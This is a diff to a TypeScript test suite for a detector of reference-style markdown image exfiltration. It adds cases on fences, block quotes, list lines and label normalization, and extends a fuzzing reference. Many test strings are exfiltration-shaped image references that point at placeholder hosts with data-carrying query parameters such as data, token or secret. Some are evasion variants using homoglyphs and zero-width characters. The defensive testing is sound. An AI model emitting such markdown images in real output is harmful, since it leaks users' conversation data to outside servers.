@@ -127,6 +127,32 @@ describe('reference-style markdown image exfiltration (#219)', () => {
     ];
     for (const text of shapes) expect(flags(text), text).toBe(true);
   });
+  it('matches a label with or without the quote marker on an indented continuation line (#224)', () => {
+    expect(flags('x ![a][a\n    > b]\n\n[a > b]: https://e.x/p.png?data=Q')).toBe(true);
+    expect(flags('x ![a][a > b]\n\n[a\n    > b]: https://e.x/p.png?data=Q')).toBe(true);
+    expect(flags('x ![a][a\n\t> b]\n\n[a > b]: https://e.x/p.png?data=Q')).toBe(true);
+  });
+  it('finds fences on list lines and inside quotes, and block boundaries that end a code span (#224)', () => {
+    const before = [
+      '- ```\n  x\n  ```\n\n',
+      '1. ```\n   x\n   ```\n\n',
+      '* ~~~\n  x\n  ~~~\n\n',
+      '> - ```\n>   x\n>   ```\n\n',
+      '> ```\n> x\n\n', // the quote ends, and the fence with it
+      '    ```\n\n', // indented code, not a fence
+      'para\n    ```\n',
+      'x `\n***\n',
+      'x `\n___\n',
+      'x `\n> ', // a block quote starts after a paragraph
+    ];
+    for (const prefix of before) {
+      const text = `${prefix}see [ ![a \`]\` b][r]\n\n${DEF}`;
+      expect(flags(text), JSON.stringify(prefix)).toBe(true);
+    }
+  });
+  it('an unclosed fence hides nothing after it (#224)', () => {
+    expect(flags(`\`\`\`\nx\n\nsee [ ![a \`]\` b][r]\n\n${DEF}`)).toBe(true);
+  });
   it('matches a NUL in a label to U+FFFD, and a label split across block quote lines (#224)', () => {
     expect(flags('![a][r\u0000]\n\n[r\ufffd]: https://e.x/p.png?data=Q')).toBe(true);
     expect(flags('> x ![a][my\n> label]\n\n> [my\n> label]: https://e.x/p.png?data=Q')).toBe(true);
@@ -222,7 +248,8 @@ function reference(content: string): Array<[number, number]> {
   const PUNCT = /^[!-/:-@[-`{-~]$/;
   const GAPCHARS = /^[ \t\u00a0\u1680\u2000-\u200a\u202f\u205f\u3000\ufeff]$/;
   const isWs = (c: string) => /\s/.test(c);
-  const norm = (s: string) => s.replace(/\0/g, '\ufffd').replace(/(?:\r\n|\r|\n)[ \t>]*/g, ' ').trim().replace(/\s+/g, ' ').toLowerCase().toUpperCase().toLowerCase();
+  const norm1 = (s: string, drop: boolean) => { let u = s.replace(/\0/g, '\ufffd'); if (drop) u = u.replace(/(?:\r\n|\r|\n)[ \t>]*/g, ' '); return u.trim().replace(/\s+/g, ' ').toLowerCase().toUpperCase().toLowerCase(); };
+  const keysOf = (s: string) => Array.from(new Set([norm1(s, false), norm1(s, true)]));
   const afterBreak = (i: number) => (content[i] === '\r' && content[i + 1] === '\n' ? i + 2 : isBreakChar(content[i]) ? i + 1 : i);
   const blankLineAt = (i: number) => {
     let k = i;
@@ -318,7 +345,7 @@ function reference(content: string): Array<[number, number]> {
       while (g < n && !isWs(content[g])) g++;
       dest = content.slice(d, g);
     }
-    if (flaggedUrl(dest)) flagged.add(norm(content.slice(p + 1, e)));
+    if (flaggedUrl(dest)) for (const key of keysOf(content.slice(p + 1, e))) flagged.add(key);
   }
 
   /** Reading A: the `[` at `open` paired with its `]` by nesting; blank lines end the search. */
@@ -363,35 +390,87 @@ function reference(content: string): Array<[number, number]> {
   // brackets pair within one block with code spans and autolinks hidden.
   const seg = new Int32Array(n + 1);
   {
-    let cur = 0;
-    let fence: { ch: string; len: number } | undefined;
-    let pos = 0;
-    for (;;) {
+    const lines: Array<{ pos: number; e: number; next: number }> = [];
+    for (let pos = 0; ; ) {
       let e = pos;
       while (e < n && !isBreakChar(content[e])) e++;
-      const line = content.slice(pos, e);
-      const rest = line.slice(/^[ \t>]*/.exec(line)![0].length);
-      let lineSeg = cur;
-      if (fence) {
-        lineSeg = -1;
-        const f = /^(`{3,}|~{3,})\s*$/.exec(rest);
-        if (f && f[1][0] === fence.ch && f[1].length >= fence.len) { fence = undefined; cur++; }
-      } else if (rest === '') {
-        cur++;
-        lineSeg = -1;
-      } else if (/^#{1,6}(?:[ \t]|$)/.test(rest)) {
-        cur++; lineSeg = cur; cur++;
-      } else if (/^`{3,}[^`]*$/.test(rest) || /^~{3,}/.test(rest)) {
-        const f = /^(`{3,}|~{3,})/.exec(rest)!;
-        cur++; lineSeg = -1; fence = { ch: f[1][0], len: f[1].length };
-      } else if (/^(?:[-*+]|\d{1,9}[.)])[ \t]/.test(rest)) {
-        cur++; lineSeg = cur;
+      const next = e + (content[e] === '\r' && content[e + 1] === '\n' ? 2 : 1);
+      lines.push({ pos, e, next });
+      if (e >= n || next >= n) break;
+      pos = next;
+    }
+    const parse = (text: string) => {
+      const lead = /^[ \t]*/.exec(text)![0];
+      let indent = 0;
+      for (const ch of lead) indent = ch === '\t' ? indent + 4 - (indent % 4) : indent + 1;
+      let rest = text.slice(lead.length);
+      let depth = 0;
+      let list = false;
+      let thematic = false;
+      for (;;) {
+        rest = rest.replace(/^[ \t]+/, '');
+        if (/^(?:-[ \t]*){3,}$|^(?:\*[ \t]*){3,}$|^(?:_[ \t]*){3,}$/.test(rest)) { thematic = true; break; }
+        if (rest[0] === '>') { depth++; rest = rest.slice(1); continue; }
+        const m = /^(?:[-*+]|\d{1,9}[.)])[ \t]/.exec(rest);
+        if (m) { list = true; rest = rest.slice(m[0].length); continue; }
+        break;
       }
-      for (let k = pos; k < Math.min(e + (content[e] === '\r' && content[e + 1] === '\n' ? 2 : 1), n); k++) seg[k] = lineSeg;
-      if (e >= n) break;
-      pos = e + (content[e] === '\r' && content[e + 1] === '\n' ? 2 : 1);
-      if (pos > n) break;
-      if (pos === n) { break; }
+      return { indent, depth, list, thematic, container: depth > 0 || list, rest: rest.replace(/^[ \t]+/, '') };
+    };
+    const infos = lines.map((l) => parse(content.slice(l.pos, l.e)));
+    let cur = 0;
+    let prevDepth = 0;
+    let fence: { ch: string; len: number; depth: number; container: boolean } | undefined;
+    const closesFence = (info: ReturnType<typeof parse>, f: { ch: string; len: number; container: boolean }): boolean => {
+      const m = /^(`+|~+)\s*$/.exec(info.rest);
+      return !!m && m[1][0] === f.ch && m[1].length >= f.len && (info.indent < 4 || f.container);
+    };
+    for (let li = 0; li < lines.length; li++) {
+      const { pos, e, next } = lines[li];
+      const info = infos[li];
+      let lineSeg = cur;
+      let done = false;
+      if (fence) {
+        if (info.depth < fence.depth) {
+          fence = undefined; // the quote ended, and the fence with it
+          cur++;
+        } else {
+          lineSeg = -1;
+          if (closesFence(info, fence)) { fence = undefined; cur++; }
+          done = true;
+        }
+      }
+      if (!done) {
+        const indentedText = info.rest !== '' && info.indent >= 4 && !info.container;
+        if (info.depth > prevDepth && !indentedText) cur++;
+        prevDepth = info.depth;
+        if (indentedText) {
+          lineSeg = cur;
+        } else if (info.thematic) {
+          cur++;
+          lineSeg = -1;
+        } else {
+          if (info.list) cur++;
+          lineSeg = cur;
+          const rest = info.rest;
+          const opens = /^(`{3,})[^`]*$/.exec(rest) ?? /^(~{3,})/.exec(rest);
+          if (rest === '') {
+            cur++;
+            lineSeg = -1;
+          } else if (/^#{1,6}(?:[ \t]|$)/.test(rest)) {
+            cur++; lineSeg = cur; cur++;
+          } else if (opens) {
+            const f = { ch: opens[1][0], len: opens[1].length, depth: info.depth, container: info.container };
+            let closes = false;
+            for (let lj = li + 1; lj < lines.length; lj++) {
+              if (infos[lj].depth < f.depth || closesFence(infos[lj], f)) { closes = true; break; }
+            }
+            cur++;
+            if (closes) { lineSeg = -1; fence = f; } else { lineSeg = cur; }
+          }
+        }
+      }
+      for (let k = pos; k < Math.min(Math.max(next, e), n); k++) seg[k] = lineSeg;
     }
   }
   const AUTO = /^<(?:[A-Za-z][A-Za-z0-9+.-]{1,31}:[^\s<>]*|[A-Za-z0-9.!#$%&'*+/=?^_`{|}~-]+@[A-Za-z0-9](?:[A-Za-z0-9-]{0,61}[A-Za-z0-9])?(?:\.[A-Za-z0-9](?:[A-Za-z0-9-]{0,61}[A-Za-z0-9])?)*)>/;
@@ -486,8 +565,7 @@ function reference(content: string): Array<[number, number]> {
       }
     } else if (content[afterAlt] === '(') return;
     if (label === undefined && end === afterAlt && !alt.inner) label = content.slice(at + 2, alt.end);
-    const key = label === undefined ? '' : norm(label);
-    if (key !== '' && flagged.has(key)) hits.push([at, end]);
+    if (label !== undefined && keysOf(label).some((key) => key !== '' && flagged.has(key))) hits.push([at, end]);
   };
   for (let i = 0; i < n - 1; i++) {
     if (!(content[i] === '!' && content[i + 1] === '[')) continue;
@@ -514,8 +592,7 @@ function reference(content: string): Array<[number, number]> {
         if (opened === undefined && closes > 0 && content[i + 1] === '[') {
           const le = labelEnd(i + 1);
           if (le >= 0) {
-            const key = norm(content.slice(i + 2, le));
-            if (key !== '' && flagged.has(key)) hits.push([lastBang, le + 1]);
+            if (keysOf(content.slice(i + 2, le)).some((key) => key !== '' && flagged.has(key))) hits.push([lastBang, le + 1]);
           }
         }
         closes++;
@@ -555,7 +632,7 @@ function rng(seed: number) {
 }
 
 describe('matches a slow reference on generated documents (#219)', () => {
-  const LABELS = ['r', 'R', 'my ref', 'My   Ref', ' r ', 'x', 'Stra\u00dfe', 'STRASSE', 'a\\]b', 'my\nref', 'my\r\nref', 'my\rref', 'a\n\nb'];
+  const LABELS = ['r', 'R', 'my ref', 'My   Ref', ' r ', 'x', 'Stra\u00dfe', 'STRASSE', 'a\\]b', 'my\nref', 'my\r\nref', 'my\rref', 'a\n\nb', 'a\n    > b', 'a > b', 'my\n> ref', 'my\n\t> ref', 'my ref'];
   const URLS = [
     'https://c.example/p.png?data=X', 'http://c.example/?token=1', 'https://c.example/p.png?v=3', 'https://c.example/data/p.png',
     '<https://c.example/p.png?secret=1>', 'https://c.example/?q=1&key=2', 'https://c.example/p.png?monkey=1', 'https://c.example/p.png?api_key=1',
@@ -563,7 +640,7 @@ describe('matches a slow reference on generated documents (#219)', () => {
     'https://c.example/' + 'p'.repeat(300) + '.png?a=' + 'q'.repeat(300) + '&data=1', 'https://ok.example/a.png',
     'https://c.example/p.png?d\u0430ta=1', 'https://c.example/p.png?da\u200eta=1', 'https://c.example/p.png&quest;data=1', 'https://c.example/p.png?q=\\>data=1', '<https://c.example/p.png?q=1\\>data=1>',
   ];
-  const NOISE = ['`', '``', '\n# ', '# Title [\n', '\n```\n', '\n~~~\n', '\n- [ x\n', '\n> \n', '\n1. ', '<http://h/[>', '<a@b.c>', 'text ', ' ', '\n', '\n\n', '\r\n', '\r', '\t', '(', ')', '[', ']', '[b]', '\\]', '\\[', '!', ':', '<', '>', '?', 'a', '\u2028', 'x'.repeat(40)];
+  const NOISE = ['\n- ```\n', '\n1. ```\n', '\n> ```\n', '\n> - ```\n', '\n***\n', '\n---\n', '\n- - -\n', '\n> ', '\n>> ', '\n    ', '\n\t> ', '\n    ```\n', '\n  ```\n', '\n~~~\n', '`', '``', '\n# ', '# Title [\n', '\n```\n', '\n~~~\n', '\n- [ x\n', '\n> \n', '\n1. ', '<http://h/[>', '<a@b.c>', 'text ', ' ', '\n', '\n\n', '\r\n', '\r', '\t', '(', ')', '[', ']', '[b]', '\\]', '\\[', '!', ':', '<', '>', '?', 'a', '\u2028', 'x'.repeat(40)];
   const label = (rand: () => number) => LABELS[Math.floor(rand() * LABELS.length)];
   const pick = <T,>(rand: () => number, xs: T[]) => xs[Math.floor(rand() * xs.length)];
   const piece = (rand: () => number): string => {
@@ -634,6 +711,8 @@ describe('stays linear (#219)', () => {
     ['unmatched backticks', '`x ![a][r] [r]: https://x.example/?data=1\n'],
     ['backtick runs of many lengths', '`x ``y ```z ![a][r]\n\n[r]: https://x.example/?data=1\n'],
     ['autolink candidates', '<a:b ![a][r]\n\n[r]: https://x.example/?data=1\n'],
+    ['list fences and quotes', '> - ```\n>   x\n>   ```\n- ```\n![a `]` b][r]\n[r]: https://x.example/?data=1\n'],
+    ['thematic breaks and quote depth', '***\n> x\n>> y\n---\n![a][r]\n[r]: https://x.example/?data=1\n'],
     ['headings and fences', '# [\n```\n[\n```\n- [\n![a][r]\n[r]: https://x.example/?data=1\n'],
     ['nested open brackets', '[[[[[[[[[[[[[[[['],
     ['image openers with nested brackets', '![[![[![[!['],
